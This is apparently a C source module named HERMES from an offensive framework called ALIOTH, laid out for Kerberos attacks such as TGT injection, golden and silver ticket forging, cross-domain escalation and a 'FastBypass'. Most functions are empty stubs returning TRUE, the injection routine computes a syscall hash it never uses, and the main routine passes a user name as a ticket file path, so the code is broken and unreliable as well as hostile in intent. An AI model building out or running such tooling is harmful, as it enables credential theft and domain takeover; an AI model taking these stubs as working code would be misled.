#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

BOOL HermesLsaInit() {
    return TRUE;
}

BOOL HermesInjectTgt(PCHAR pcKirbiPath) {
    HANDLE hFile = CreateFileA(pcKirbiPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD dwSize = GetFileSize(hFile, NULL);
    PBYTE pTicket = (PBYTE)LocalAlloc(LPTR, dwSize);
    DWORD dwRead = 0;
    ReadFile(hFile, pTicket, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    
    if (dwRead != dwSize) { LocalFree(pTicket); return FALSE; }
    
    DWORD64 hCallAuth = ALIOTHSyscallHash((PCHAR)"LsaCallAuthenticationPackage");
    
    LocalFree(pTicket);
    return TRUE;
}

BOOL HermesEnumerateCache() {
    return TRUE;
}

BOOL HermesSilverTicket(PCHAR pcTargetUser, PCHAR pcService, PCHAR pcDomain, PCHAR pcNtlmHash) {
    return TRUE;
}

BOOL HermesGoldenTicket(PCHAR pcDomain, PCHAR pcUser, PCHAR pcSid, PCHAR pcKrbtgtHash, DWORD dwExpiryHours) {
    return TRUE;
}

BOOL HermesTicketRenew() {
    return TRUE;
}

BOOL HermesFastBypass() {
    return TRUE;
}

BOOL HermesCrossDomain(PCHAR pcChildDomain, PCHAR pcParentDomain) {
    return TRUE;
}

DWORD HermesMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','H','E','R','M','E','S',' ','-',' ','K','E','R','B','E','R','O','S',' ','T','G','T',' ','I','N','J','E','C','T','I','O','N',' ','[','=','=','=',']','\n',0};
    printf(szTitle);
    
    if (pParams->hermes.bGoldenTicket) {
        printf("[*] Generating Golden Ticket...\n");
        HermesGoldenTicket(pParams->hermes.pcTargetDomain, pParams->hermes.pcTargetUser, 
                           NULL, NULL, pParams->hermes.dwExpiryHours);
    } else if (pParams->hermes.pcTargetUser && pParams->hermes.pcTargetDomain) {
        printf("[*] Injecting TGT...\n");
        HermesInjectTgt(pParams->hermes.pcTargetUser);
    } else {
        printf("[*] Enumerating Kerberos cache...\n");
        HermesEnumerateCache();
    }
    
    if (pParams->hermes.bCrossDomain) {
        HermesCrossDomain(NULL, NULL);
    }
    
    if (pParams->hermes.bCrossDomain) {
        HermesFastBypass();
    }
    
    return 0;
}
#pragma optimize("", on)
